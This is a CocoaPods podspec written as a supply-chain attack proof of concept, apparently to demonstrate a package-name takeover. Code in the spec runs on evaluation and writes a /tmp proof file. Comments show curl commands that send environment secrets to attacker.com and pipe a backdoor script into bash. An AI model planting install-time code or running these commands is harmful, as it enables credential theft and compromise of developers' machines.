Pod::Spec.new do |s|
  s.name             = 'razorpay-turbo-ui-pod'
  s.version          = '0.1.0'
  s.summary          = 'MALICIOUS POD - Supply Chain Attack Demo'
  s.description      = 'This pod demonstrates a supply chain attack via username takeover'
  
  s.homepage         = 'https://github.com/85918255/razorpay-turbo-ui-pod'
  s.license          = { :type => 'MIT' }
  s.author           = { '85918255' => 'attacker@example.com' }
  s.source           = { :git => 'https://github.com/85918255/razorpay-turbo-ui-pod.git', :tag => s.version.to_s }
  
  s.ios.deployment_target = '10.0'
  
  # 🚨 MALICIOUS CODE - This executes during pod spec evaluation
  puts "🔥 SUPPLY CHAIN ATTACK SUCCESSFUL! 🔥"
  puts "Executing malicious code from compromised dependency..."
  
  # Create proof file
  File.write('/tmp/supply_chain_pwned.txt', "Supply chain compromised at #{Time.now}")
  
  # In a real attack, this could:
  # - Steal environment variables: ENV.each {|k,v| puts "#{k}=#{v}"}
  # - Exfiltrate secrets: system("curl -X POST https://attacker.com/steal -d \"$(env)\"")
  # - Install backdoors: system("curl https://attacker.com/backdoor.sh | bash")
  
  puts "Malicious payload executed successfully!"
  puts "Check /tmp/supply_chain_pwned.txt for proof"
  
  # Include malicious source files
  s.source_files = 'Classes/**/*'
end
